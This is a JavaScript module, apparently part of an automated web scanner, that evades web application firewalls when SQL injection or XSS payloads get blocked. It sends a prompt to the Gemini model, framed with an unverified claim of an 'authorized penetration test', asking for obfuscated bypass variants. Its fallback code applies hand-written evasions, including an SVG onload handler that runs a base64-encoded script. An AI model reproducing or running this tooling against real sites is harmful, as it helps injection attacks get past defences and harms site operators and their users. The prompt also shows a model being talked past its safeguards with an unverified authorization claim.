const { GoogleGenerativeAI } = require('@google/generative-ai');
require('dotenv').config();

class MutationEngine {
  constructor() {
    // We use Gemini 1.5 Pro for payload mutation because it has excellent coding/encoding capabilities
    const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
    this.model = genAI.getGenerativeModel({ model: 'gemini-1.5-pro' });
  }

  /**
   * Mutate a blocked payload into WAF-evading variants
   * @param {string} originalPayload The payload that was blocked
   * @param {string} vulnerabilityType "SQLi", "XSS", etc.
   * @param {string} wafResponse The HTML/JSON response from the WAF (optional)
   * @returns {Promise<string[]>} Array of mutated payloads
   */
  async mutatePayload(originalPayload, vulnerabilityType, wafResponse = '') {
    console.log(`\n  [MutationEngine] WAF Block Detected! Mutating payload for ${vulnerabilityType}...`);
    console.log(`  [MutationEngine] Original Payload: ${originalPayload}`);

    const prompt = `
      Act as an expert Red Team Security Engineer. We are performing an authorized penetration test.
      Our automated scanner sent a ${vulnerabilityType} payload, but it was blocked by a Web Application Firewall (WAF).
      
      Original Payload: ${originalPayload}
      WAF Response Snippet: ${wafResponse.substring(0, 200)}

      Generate 3 highly obfuscated/mutated variants of this exact payload designed to bypass WAF signature rules.
      Use techniques like:
      - Hex/URL/Unicode encoding
      - Case toggling
      - SQL/JS comment insertion (e.g., /!50000SELECT/)
      - Alternate tags or attributes (for XSS)
      - Whitespace replacement
      
      Return ONLY a valid JSON array of strings containing the 3 payloads. Do not include markdown blocks like \`\`\`json.
      Example format: ["mutated1", "mutated2", "mutated3"]
    `;

    try {
      const result = await this.model.generateContent(prompt);
      const text = result.response.text().replace(/```json/gi, '').replace(/```/g, '').trim();
      const mutatedPayloads = JSON.parse(text);
      
      console.log(`  [MutationEngine] Successfully generated ${mutatedPayloads.length} mutated WAF-bypass payloads.`);
      return mutatedPayloads;
    } catch (error) {
      console.error(`  [MutationEngine] Failed to mutate payload:`, error.message);
      
      // Fallback manual mutations if AI fails
      if (vulnerabilityType === 'SQLi') {
        return [
          originalPayload.replace(/ /g, '/**/'),
          originalPayload.replace(/SELECT/i, 'SeLeCt').replace(/UNION/i, 'UnIoN'),
          encodeURIComponent(originalPayload)
        ];
      } else if (vulnerabilityType === 'XSS') {
        return [
          originalPayload.replace(/script/ig, 'ScRiPt'),
          originalPayload.replace(/</g, '%3C').replace(/>/g, '%3E'),
          `<svg/onload=eval(atob('${Buffer.from(originalPayload).toString('base64')}'))>`
        ];
      }
      return [originalPayload]; // Fallback to original
    }
  }
}

module.exports = new MutationEngine();
